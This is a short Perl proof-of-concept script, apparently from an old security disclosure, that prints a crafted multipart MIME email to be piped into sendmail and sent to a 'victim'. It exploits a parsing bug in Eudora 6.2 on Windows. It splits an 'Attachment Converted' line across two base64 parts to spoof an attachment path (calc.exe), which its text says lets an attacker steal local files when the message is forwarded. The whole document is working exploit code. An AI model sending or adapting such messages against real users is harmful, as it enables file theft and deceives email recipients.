#!/usr/bin/perl --

use MIME::Base64;

print "From: me\n";
print "To: you\n";
print "Subject: Eudora 6.2 on Windows spoof\n";
print "MIME-Version: 1.0\n";
print "Content-Type: multipart/mixed; boundary=\"zzz\"\n";
print "X-Use: Pipe the output of this script into:  sendmail -i victim\n\n";

print "--zzz\n";
print "Content-Type: text/plain\n";
print "Content-Transfer-Encoding: 7bit\n\n";
print "With spoofed attachments, we could 'steal' files if the message
was forwarded (not replied to). Get a warning when stealing arbitrary
files, but no warning when stealing 'attach\\existing' attachments.\n";

print "\n--zzz\n";
print "Content-Type: text/plain; name=\"b1.txt\"\n";
print "Content-Transfer-Encoding: base64\n";
print "Content-Disposition: inline; filename=\"b1.txt\"\n\n";
$z = "Within base64 encoded, use missing linebreak. Part 1 ...\r
AttachmenXX";
print encode_base64($z);

print "\n--zzz\n";
print "Content-Type: text/plain; name=\"b2.txt\"\n";
print "Content-Transfer-Encoding: base64\n";
print "Content-Disposition: inline; filename=\"b2.txt\"\n\n";
$z = "t Converted: \"c:\\winnt\\system32\\calc.exe\"\r
... part 2\r
BTW, the above shows a parsing bug: missing two characters.\r
\r\n";
print encode_base64($z);

print "\n--zzz--\n";

